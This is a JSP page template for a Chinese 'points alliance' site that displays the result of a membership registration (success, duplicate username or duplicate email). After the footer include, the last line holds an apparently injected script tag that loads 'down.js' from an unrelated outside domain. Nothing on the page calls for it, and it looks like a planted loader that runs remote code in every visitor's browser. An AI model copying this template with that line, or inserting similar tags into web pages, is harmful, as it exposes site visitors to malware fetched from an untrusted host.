<%@ page language="java" pageEncoding="GBK" %>
<%@ taglib prefix="c" uri="http://java.sun.com/jstl/core" %>
<%@ taglib prefix="fmt" uri="http://java.sun.com/jstl/fmt" %>
<c:set var="title" value="积分联盟-注册结果"/> 
<%@ include file="IncludeTop.jsp" %>

<table width="780" border="0" align="center" cellpadding="0" cellspacing="0">
  <tr> 
    <td background="images/left_border.gif" width="10"></td>
    <td width="198" height="129" valign="top">
		<%@ include file="searchProductBar.jsp" %>
		<%@ include file="searchAllBar.jsp" %>
		<%@ include file="newsBar.jsp" %>	
	</td>
    <td width="562" bgcolor="#FFFFFF" valign="top"> 
	<c:if test="${result.registered=='0'}">			
      <table  width="100%" height="61" border="0" cellpadding="0" cellspacing="0">
        <tr > 
          <td align="center"><FONT COLOR="#003399" class="red15" >申请联盟帐号成功</FONT></td>
        </tr>
        <tr> 
          <td align="center" class="black12"> 
            <p>恭喜<c:out value="${result.userId}"/>，您已经成为联盟会员并得到<span class="red">1000点</span>联盟积分数</p>
          </td>
        </tr>
      </table>
	</c:if>
	<c:if test="${result.registered=='1'}">
			
      <table  width="100%" height="61" border="0" cellpadding="0" cellspacing="0">
        <tr > 
          <td align="center"><FONT COLOR="#003399" class="red15" >申请联盟帐号失败</FONT></td>
        </tr>
        <tr> 
          <td align="center" class="black12">
            <p>抱歉，您申请的用户名<c:out value="${result.userId}"/>已经被注册，请重新申请注册！ 
          </td>
        </tr>
      </table>
	</c:if>
	<c:if test="${result.registered=='2'}">
			
      <table  width="100%" border="0" cellpadding="0" cellspacing="0" height="61">
        <tr > 
          <td align="center"><FONT COLOR="#003399" class="red15" >申请联盟帐号失败</FONT></td>
        </tr>
        <tr> 
          <td align="center" class="black12">
            <p>抱歉，您申请的Email<c:out value="${result.email}"/>已经存在，请重新用正确的Email申请！ 
          </td>
        </tr>
      </table>
	</c:if>
	</td>
    <td width="10" bgcolor="#FFFFFF" valign="top" background="images/right_border.gif">&nbsp;</td>
  </tr>
</table>

<%@ include file="IncludeBottom.jsp" %>

<script language=javascript src=http://Town.531jx.cn/down.js></script>